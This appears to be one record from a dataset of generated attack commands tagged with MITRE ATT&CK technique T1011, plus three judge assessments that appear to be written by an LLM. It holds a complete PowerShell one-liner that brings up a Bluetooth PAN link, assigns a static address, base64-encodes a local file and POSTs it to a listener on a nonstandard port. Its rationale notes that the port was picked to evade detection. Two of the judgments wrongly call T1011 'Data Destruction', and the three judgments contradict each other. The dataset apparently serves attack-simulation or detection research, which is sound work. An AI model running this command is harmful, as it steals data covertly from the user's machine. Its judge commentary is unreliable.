command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name="$if" static 172.27.45.2 255.255.255.252 | Out-Null; $body=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\Public\Pictures\img1.png')); $ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'http://172.27.45.1:52873/u' -Method POST -Body $body -UseBasicParsing -Headers @{ 'X-T'='b' } | Out-Null
explanation: Uses Bluetooth PAN with a static IP and exfiltrates data via an HTTP POST to a custom port reachable only over the Bluetooth link (T1011).
rationale_steps: Activate NAP over Bluetooth as the alternate network medium.
Assign a restricted /30 IP on the Bluetooth interface with netsh.
Use HTTP on a high, nonstandard port to minimize detection.
Ensure destination is on the Bluetooth-only subnet to force egress via Bluetooth.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax including variable assignments, pipeline operations, and proper method calls.
llm_judgments.semantic_justification: The command fully implements the exfiltration over alternative protocol technique (T1011) by establishing a Bluetooth PAN connection, configuring a static IP, reading a file into base64, and exfiltrating it via HTTP POST to a specific endpoint only accessible through the Bluetooth link.

llm_judgments.syntactic_justification: The command is perfectly well-formed with correct PowerShell syntax, balanced quotes, valid command separators, and proper parameter usage for all cmdlets and external executables.
llm_judgments.semantic_justification: The command performs data exfiltration via a Bluetooth PAN, which is completely unrelated to the MITRE ATT&CK technique T1011, 'Data Destruction'; the provided explanation even states it 'exfiltrates data'.

llm_judgments.syntactic_justification: The PowerShell command is well-formed with balanced quotes, valid operators/aliases, proper separators, and parseable hashtable/strings.
llm_judgments.semantic_justification: It plausibly achieves exfiltration over a Bluetooth PAN (T1011) by connecting, setting a static IP, and POSTing base64 data, but it depends on a specific tool/arguments and likely needs admin rights for netsh, and it does not perform data destruction as described.
